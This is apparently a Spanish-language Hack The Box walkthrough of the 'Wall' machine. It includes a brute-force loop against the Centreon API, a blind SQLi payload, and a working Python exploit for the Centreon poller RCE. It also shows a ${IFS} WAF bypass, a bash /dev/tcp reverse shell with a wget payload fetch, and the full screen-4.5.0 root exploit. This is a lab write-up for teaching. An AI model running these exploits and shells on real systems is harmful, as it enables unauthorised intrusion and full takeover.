# 10.10.10.157 - Wall

![Wall](https://user-images.githubusercontent.com/96772264/206703371-375e30df-4797-48d0-a783-fae853f98749.png)

----------------------
# Part 1: Enumeración básica 

Puertos abiertos 22(ssh), 80(http)
```console
└─$ whatweb http://10.10.10.157
Apache[2.4.29] -> Title[Apache2 Ubuntu Default Page: It works]
```
Nos encontramos la página por defecto de Apache. Vamos a mepezar por el fuzzing.
```console
└─$ wfuzz -c --hl=12 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.10.10.10.157" -u http://10.10.10.157/ -t 100
# Nada
└─$ wfuzz -c --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.157/FUZZ/
000003458:   401        14 L     54 W       459 Ch      "monitoring"
000000070:   403        11 L     32 W       293 Ch      "icons"
000095511:   403        11 L     32 W       301 Ch      "server-status"
```

Hacer una petición a /monitoring nos da un 401 unauthorized, es decir le faltan credenciales.
No tenemos mas puertos así que hay que seguir buscando por aquí. Muchas veces las peticiones con el parámetro  de curl "-I" te revela información de las cabeceras.
Aquí no nos da nada, pero esta la opción también de cambiar el método.  

```console
└─$ wfuzz -c -X POST --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.157/FUZZ/
000003458:   200        5 L      21 W       154 Ch      "monitoring"
└─$ curl -s -X POST http://10.10.10.157/monitoring/  
<meta http-equiv="refresh" content="0; URL='/centreon'" />
```
----------------------------
# Part 2: Bruteforceando el login de Centreon 

Acabamos en un panel de login de centreon. Ponemos las creds por defecto que son admin:Centreon123! pero no nos dejan. Eso si, abajo se leakea la versión 19.04.0 
No se puede bruteforcear por:  
![wall1](https://user-images.githubusercontent.com/96772264/206703563-c0c89f5b-b020-41bf-84d7-e3517ea28717.PNG)

```console
└─$ curl -s http://10.10.10.157/centreon/ | grep "input"
...
<input name="centreon_token" type="hidden" value="6c62e24f39bd058befeb7056f5607328" /> # cambia siempre.
```
```console
└─$ wfuzz -c --hc=404 -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.157/centreon/FUZZ/
# Un montón de rutas
```
- /api -> 401 unauthorized.
	* /api/interface -> un php  
	* /api/class -> muchos phps  
- /img -> tiene directory listing, pero solo muestra fotos.  
- /themes -> lo mismo, nada interesante, al giual con /widgets, /sounds /modules, /static, /locale  
- /lib -> existe *wz_tooltip.js	 v. 5.20*  
- /include, /class-> un monton de phps  

Si buscas en google centreon api te sale como busqeda sugerida "login", lo que te da la documentacion [oficial](https://docs.centreon.com/docs/api/rest-api-v1/)

```console
└─$ curl -s -X POST /api/index.php?action=authenticate -d "{'username': 'test', 'password': 'test'}"
# Bad parameters
└─$ curl -s -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -d "username=test&password=test"
# Bad parameters
└─$ curl -s -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -d "username=test&password=test"
"Bad credentials"

# Con wfuzz hay una manera para fuzzear parametros
└─$ wfuzz -c --hc 403 -X POST -t 100 -w /usr/share/wordlists/rockyou.txt -d 'username=admin&password=FUZZ' "http://10.10.10.157/centreon/api/index.php?action=authenticate"
000000028:   200        0 L      1 W        62 Ch       "password1"
```
Si no disponemos de curl, bash tiene también sus herramientas (y tambien python)

```bash
for i in $(cat /usr/share/wordlists/rockyou.txt); do
    echo -n "$i: "
    curl -s -X POST http://10.10.10.157/centreon/api/index.php?action=authenticate -d "username=admin&passwor
d=$i"
    echo
done
```
```console
└─$ bash creds.sh | tee output 
└─$ cat output | grep -v "Bad"
password1: {"authToken":"5fQ3VjxYW4yd\/Dcs5rA4rGddwn\/OTYnldovNzzYiWzY="}
```
![wall2](https://user-images.githubusercontent.com/96772264/206703605-1e72d92c-3aa7-4407-a1b6-8a1c65f8f32f.PNG)

----------------------------
# Part 3: Explotando un RCE en Centreon

En searchploit hay dos exploit principales:  
- Un blindsqli -> ```/include/monitoring/acknowlegement/xml/broker/makeXMLForAck.php?hid=15&svc_id=1 AND (SELECT 1615 FROM SELECT(SLEEP(5)))TRPy)```  
- Pollers RCE  

Pollers RCE dice que:  
- irse a /centreon/main.php?p=60803&type=3 (Configuration > Commands > Miscellaneous)  
![wall3](https://user-images.githubusercontent.com/96772264/206703644-1f638810-9463-4cf7-acb3-0cb5e82f4b4c.PNG)  

Hay un script que explota este Poller RCE -> 47069.py (CVE-2019-13024/@mohammadaskar2)  
He creado un exploit basado en el de esta persona solo que usando librerias mas simples y todo adaptado a esta máquina. He simplicado su script todo lo posible 
pero que siga siendo funcional y he añadido un código de estado para ver como se comportan los comandos

```python
#!/usr/bin/python
import re
import requests
import sys

url = "http://10.10.10.157/centreon"
command = sys.argv[1]
sess = requests.session()
print("[+] Iniciando el exploit...")

# Primera petición para conseguir el token
req1 = sess.get(url + "/index.php") 
token = re.findall(r'<input name="centreon_token" type="hidden" value="(.*?)" />', req1.text)[0]

# Segunda petición: login a index php con las credenciales que hemos conseguido
data = { "useralias": "admin", "password": "password1", "submitLogin": "Connect", "centreon_token": token}
login = sess.post(url + "/index.php", data=data)
print(f"    >  Token -> {token}")
print("    >  Logueado!")

# Tercera petición: conseguir el token (siguiendo exl exploit, el tercer "centreon_token")
poller_conf = url + "/main.get.php?p=60901"
poller = sess.get(poller_conf)
poller_token = re.findall(r'<input name="centreon_token" type="hidden" value="(.*?)" />', poller.text)[2]
print(f"    >  Poller token: {poller_token}")

# Cuarta petición: mandando el payload ( Configuration > Commands > Miscellaneous )
payload = {
    "name": "Central",
    "ns_ip_address": "127.0.0.1",
    "localhost[localhost]": "1",
    "is_default[is_default]": "0",
    "remote_id": "",
    "ssh_port": "22",
    "init_script": "centengine",
    "nagios_bin": command,
    "nagiostats_bin": "/usr/sbin/centenginestats",
    "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
    "centreonbroker_cfg_path": "/etc/centreon-broker",
    "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
    "centreonbroker_logs_path": "",
    "centreonconnector_path": "/usr/lib64/centreon-connector",
    "init_script_centreontrapd": "centreontrapd",
    "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
    "ns_activate[ns_activate]": "1",
    "submitC": "Save",
    "id": "1",
    "o": "c",
    "centreon_token": poller_token}

RCE = sess.post(poller_conf, payload)
print(f"[+] Código de estado: {RCE.status_code}")

# Quinta petición: generar un xml para activar el comando de antes
generate_xml_page = url + "/include/configuration/configGenerate/xml/generateFiles.php"
xml_page_data = {"poller": "1", "debug": "true", "generate": "true",}
sess.post(generate_xml_page, xml_page_data)
```

----------------------------
# Part 4: Bypaseando un WAF 
```console
└─$ python3 ./exploit.py 'whoami' # -> [+] Código de estado: 200
└─$ python3 ./exploit.py 'curl http://10.10.14.16' # -> [+] Código de estado: 403
```
Unos comandos funcionan y otros no. Puede que haya un WAF (firewall web)  
- Probar a cambiar espacios por "${IFS}" (una varaible de entorno que representa un espacio)  

```console
└─$ python3 ./exploit.py 'wget${IFS}10.10.14.16' 
└─$ sudo python3 -m http.server 80 # -> 10.10.10.157 - - [08/Dec/2022 18:25:08] "GET / HTTP/1.1" 200 -
```
Con curl no recibia una peticion pero con wget si.  

```
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'
```
```console
└─$ python3 ./exploit.py 'wget${IFS}10.10.14.16/index.html${IFS}-O${IFS}/tmp/shell;${IFS}bash${IFS}-i${IFS}/tmp/shell'
```
``` wget 10.10.14.16/index.html -O /tmp/shell; bash -i /tmp/shell ```

----------------------------
# Part 5: Accediendo al sistema

Con eso accedí al sistema. ```sudo nc -nlvp 443```. Hice ```which curl``` para ver si existia ese comando y no.  
Subi mi script de reconocimiento:  
- Archivos de configuración: /etc/centreon/conf.pm /etc/centreon/centreon.conf.php   
- SUIDS -> /bin/screen-4.5.0  

Para screen hay un exploit.  
```console
www-data@Wall:/tmp$ wget 10.10.14.16/41154.sh -O /tmp/screen.sh
www-data@Wall:/tmp$ chmod +x screen.sh
www-data@Wall:/tmp$ ./screen.sh
# whoami
root
# bash                         
root@Wall:/etc#
```
El exploit utiliza este sistema:  
```console
$:~ screen -D -m -L archivo echo "Hola Mundo"
$:~ ls -l bla.bla
-rw-rw---- 1 root root 6 Jan 24 19:58 archivo
$:~ cat archivo
Hola Mundo
```
 
41154.sh > Vamos a analizar el exploit...  

```bash
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c  # Librería en código c
#include <stdio.h> 
#include <sys/types.h>
#include <unistd.h>  -> tipicas librerias de c
__attribute__ ((__constructor__))
void dropshell(void){ 
    chown("/tmp/rootshell", 0, 0); # -> /tmp/rootshell será propiedad de root 
    chmod("/tmp/rootshell", 04755); # -> también suid con privielgios máximos
    unlink("/etc/ld.so.preload"); # -> deslinkea la libreria que se carga siempre al iniciar screen
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c # este codigo que ha creado en c lo compila en una libreri
rm -f /tmp/libhax.c

cat << EOF > /tmp/rootshell.c # Una vez hecho esto crea un script en c que elevará privilegios
#include <stdio.h>
int main(void){
    setuid(0); 
    setgid(0);
    seteuid(0);
    setegid(0); # -> todo esto eleva privilegios para los comandos futuros
    execvp("/bin/sh", NULL, NULL); #  o sea para esto "bin/sh"
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c # lo compila
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # mete la libreria esta en ld.so.preload
screen -ls # screen itself is setuid, so... # Ahora se ejecuta con la libreria maliciosa el script de altos privs
/tmp/rootshell
```
